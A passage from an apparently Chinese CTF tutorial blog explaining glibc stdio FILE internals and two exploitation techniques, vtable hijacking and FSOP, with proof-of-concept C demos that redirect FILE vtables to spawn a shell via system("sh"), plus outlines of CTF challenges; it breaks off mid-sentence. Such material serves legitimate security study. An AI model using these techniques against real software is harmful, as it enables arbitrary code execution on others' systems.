(fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h3><blockquote><p>涉及源码文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libio/iofwrite.c</span><br><span class="line">libio/libioP.h</span><br><span class="line">libio/fileops.c</span><br></pre></td></tr></table></figure></blockquote><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fwrite</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* buffer, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> count, FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li><li>size: 要写入内容的单字节数;</li><li>count: 要进行写入 size 字节的数据项的个数;</li><li>stream: 目标文件指针;</li><li>返回值：实际写入的数据项个数 count。</li></ul><p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p><p>根据前面对_IO_FILE_plus 的介绍，可知_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">written = _IO_sputn (fp, (<span class="keyword">const</span> <span class="keyword">char</span> *) buf, request);</span><br></pre></td></tr></table></figure><p>在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>_IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br></pre></td></tr></table></figure><p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><blockquote><p>涉及源码文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libio/iofopen.c</span><br><span class="line">libio/fileops.c</span><br><span class="line">libio/genops.c</span><br></pre></td></tr></table></figure></blockquote><p>fopen 在标准 IO 库中用于打开文件，函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">char</span> *filename, *type)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>filename: 目标文件的路径</li><li>type: 打开方式的类型</li><li>返回值: 返回一个文件指针</li></ul><p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p><p>首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br></pre></td></tr></table></figure><p>之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">_IO_file_init (&amp;new_f-&gt;fp);</span><br></pre></td></tr></table></figure><p>在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (fp)</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *<span class="title">fp</span>;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></table></figure><p>总结一下 fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h3><blockquote><p>涉及源码文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libio/iofclose.c</span><br></pre></td></tr></table></figure></blockquote><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">(FILE *stream)</span></span></span><br></pre></td></tr></table></figure><p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p><p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure><p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure><h3 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h3><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会<strong>调用 vtable 中的_IO_sputn</strong>，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vfprintf</span>+<span class="number">11</span></span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure><h2 id="伪造-vtable-劫持程序流程"><a href="#伪造-vtable-劫持程序流程" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h2><blockquote><p>&lt;libc 2.23 –&gt; 修改 vtable 中某些函数的指针</p><p>&gt;=libc 2.23 –&gt; 通过伪造 vtable 结构体来调用某些函数的指针</p></blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>IO 操作函数需要经过 FILE 结构进行处理。尤其是 _IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p><p>因此伪造 vtable 劫持程序流程的中心思想就是<strong>针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</strong></p><p><strong>vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</strong></p><h3 id="原理示例"><a href="#原理示例" class="headerlink" title="原理示例"></a>原理示例</h3><p>修改 vtable 中的指针，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=<span class="number">0x41414141</span> <span class="comment">//xsputn</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;call 0x41414141&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据 vtable 在 _IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后搞清楚劫持的 IO 函数会调用 vtable 中的哪个虚函数。vtable 函数进行调用时，传入的第一个参数其实是对应的 _IO_FILE_plus 地址。比如调用 printf ，传递给 vtable 的第一个参数是 _IO_2_1_stdout_ 的地址。利用这点可以实现给劫持的 vtable 函数传參，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    memcopy(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在目前 <strong>libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的</strong>。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先分配一款内存来存放<strong>伪造的 vtable，之后修改 _IO_FILE_plus 的 vtable 指针指向这块内存</strong>。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。</p><p><strong>因为 vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入 _IO_FILE_plus 头部</strong>。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</p><p>同样，如果程序中不存在 fopen 等函数创建的 _IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的 _IO_FILE ，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print &amp;_IO_2_1_stdin_</span><br><span class="line">$2 &#x3D; (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line"></span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br></pre></td></tr></table></figure><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><ul><li>vtable 劫持分为两种：<ul><li>直接改写 vtable 中的虚函数指针</li><li>覆盖 vtable 的指针（伪造 vtabel）</li></ul></li><li>libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入</li><li>vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，可以将 sh 或其他参数写入 _IO_FILE_plus 头部</li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h4><blockquote><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/">题目链接</a></p><p>通过伪造 vtabel 实现运行特定函数（修改虚函数的 overflow 指针）</p><p>其他做法：<a href="https://blog.csdn.net/Mira_Hu/article/details/103736917">https://blog.csdn.net/Mira_Hu/article/details/103736917</a></p></blockquote><h5 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h5><p>除了 canary 保护全开，任意地址写 5 字节</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>在程序调用 exit 后，会遍历 _IO_list_all ，调用 <em>IO_2_1_stdout</em> 下的 vatable 中 _setbuf 函数。先修改两个字节在当前 vtable 附近伪造一个 fake_vtable ，然后使用 3 个字节修改 fake_vtable 中 _setbuf 的内容为 one_gadget 。</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>进程内所有的 _IO_FILE 结构会使用 _chain 域相互连接形成一个链表，这个链表的头部由 _IO_list_all 维护。</p><p>FSOP 的核心思想就是劫持 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 _IO_flush_all_lockp，这个函数会刷新 _IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用 _IO_FILE_plus.vtable 中的 _IO_overflow。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210172118.jpeg" alt="img"></p><p>而 _IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210172159.png" alt="image-20201208195441734"></p></li><li><p>当执行流从 main 函数返回时</p></li></ol><h3 id="原理示例-1"><a href="#原理示例-1" class="headerlink" title="原理示例"></a>原理示例</h3><p>FSOP 利用的条件：泄露 libc.so 基址，因为 _IO_list_all 是作为全局变量储存在 libc.so 中的；用任意地址写把 _IO_list_all 改为指向可控内存的地址；伪造 _IO_FILE_plus 结构体。伪造结构体需要 bypass 这些 check ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>也就是</p><ul><li><strong>fp-&gt;_mode &lt;= 0</strong></li><li><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></li></ul><p>写一个 demo 验证一下：首先分配一块内存用于存放伪造 _IO_FILE_plus（_IO_FILE、vtable)。_IO_write_ptr、_IO_write_base、_mode 等数据偏移如下（可以通过查前面给出结构体算出来）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *list_all_ptr;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="comment">//bypass</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+vtable_offset)=((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//vtable _IO_overflow</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"><span class="comment">//orw _IO_list_all _chain 2 fake _IO_FILE_plus</span></span><br><span class="line">    list_all_ptr=(<span class="keyword">long</span> <span class="keyword">long</span> *)_IO_list_all;</span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前 0x100 个字节作为 _IO_FILE ，后 0x100 个字节作为 vtable ，在 vtable _IO_overflow 指针劫持为 0x41414141 。</p><p>之后，覆盖 libc 中的全局变量 _IO_list_all 指向伪造的 _IO_FILE_plus 。</p><blockquote><p>全局变量 _IO_list_all 存储着结构体 _IO_FILE_plus 的地址，这个地址也是 _IO_FILE 所在地址，后面是 vtable </p></blockquote><p>通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush[^1] 获取 _IO_list_all 的值并取出作为 _IO_FILE_plus <strong>调用其中的 _IO_overflow 函数</strong>实现功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---&gt; call _IO_overflow</span><br><span class="line">[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock&#x3D;0x0)</span><br><span class="line">[#1] 0x7ffff7a8932a → Name: _IO_cleanup()</span><br><span class="line">[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status&#x3D;0x0, listp&#x3D;&lt;optimized out&gt;, run_list_atexit&#x3D;0x1)</span><br><span class="line">[#3] 0x7ffff7a47045 → Name: __GI_exit(status&#x3D;&lt;optimized out&gt;)</span><br><span class="line">[#4] 0x4005ce → Name: main()</span><br></pre></td></tr></table></figure><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><h4 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h4><blockquote><p>大体是用 FSOP 思路，不是劫持 _IO_list_all _chain 指针伪造一个结构体；而直接修改 _IO_FILE_plus </p></blockquote><h4 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h4><p>保护全开，用的是 buu 的远程环境对应是 Ubuntu 16 libc 2.23：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enable</span><br></pre></td></tr></table></figure><p>程序只能有一个堆，用结构体维护，结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  size;<span class="comment">//8bit</span></span><br><span class="line">  data;<span class="comment">//8bit</span></span><br><span class="line">  chunk_addr;<span class="comment">//8bit  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>在 add 时写入 author 